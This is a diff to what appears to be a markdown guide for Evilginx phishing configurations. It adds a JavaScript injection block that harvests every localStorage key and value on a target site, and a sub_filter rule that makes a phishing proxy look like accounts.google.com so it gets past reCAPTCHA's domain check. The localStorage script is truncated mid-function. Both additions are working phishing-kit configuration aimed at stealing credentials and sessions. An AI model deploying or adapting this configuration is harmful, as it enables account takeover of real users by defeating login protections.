@@ -38,6 +38,39 @@ js_inject:
       }
       setTimeout(function(){lp();}, 100);
 ```
+
+### #js_inject cookie
+The script is designed to load and store the current state of localStorage in the current Local Storage State object```
+
+```
+js_inject:
+- trigger_domains: ["www.exemple.com"]
+trigger_paths: ["/(.*)"]
+trigger_params: []
+script: |
+let previousTime = '';
+
+function logTimeLoop() {
+const currentLocalStorageState = {};
+
+for (let i = 0; i < localStorage.length; i++) {
+const key = localStorage.key(i);
+const value = localStorage.getItem(key);
+currentLocalStorageState[key] = value;
+}
+```
+### Recaptcha Bypass
+- This method works by modifying the javascript code responsible to generate the base64 string which contains the domain name.
+- Subfilter can be modified accordingly based on the target site.
+```
+proxy_hosts:
+  - {phish_sub: 'exemple', orig_sub: 'www', domain: 'exemple.com', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  # Change/modify the value assigned to variable 'A' based on your target site. 
+  - {triggers_on: 'www.exemple.com', orig_sub: 'exemple', domain: 'exemple.com', search: 'A=si&&!d\?lX\.btoa\(y\):S\[6]\(40,l\[0],O\[l\[1]]\(24,0,8,y\),d\)', replace: 'A="aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tOjQ0Mw."', mimes: ['text/javascript']}
+```
+
 >### info
 This part applies only to Evilginx Pro users who have access to Evilpuppet module.
 
